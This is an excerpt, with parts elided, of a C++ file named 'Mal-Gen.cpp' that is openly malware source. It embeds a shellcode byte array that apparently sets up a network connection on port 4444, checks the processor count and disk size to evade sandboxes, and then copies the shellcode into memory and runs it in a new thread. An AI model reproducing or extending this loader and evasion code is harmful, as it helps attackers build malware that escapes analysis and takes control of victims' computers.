// Mal-Gen.cpp : This file contains the 'main' function. Program execution begins and ends there.
...
void main()
{
	const unsigned char buf1[] =
		...
		"\x00\x49\x89\xe5\x49\xbc\x02\x00\x11\x5c\x00\x00\x00\x00"
	...
	if (numberOfProcessors < 2) return;
	...
	// check HDD
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, nullptr, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)nullptr);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * pDiskGeometry.TracksPerCylinder * pDiskGeometry.SectorsPerTrack * pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	if (diskSizeGB < 100) {
		return;
	}
	...
	if (shell_exec == nullptr) {
		...
		memcpy(shell_exec, buf1, sizeof(buf1));
		DWORD threadID;
		...
		HANDLE hThread = CreateThread(nullptr, 0, (PTHREAD_START_ROUTINE)shell_exec, nullptr, 0, &threadID);
		if (hThread == nullptr) {
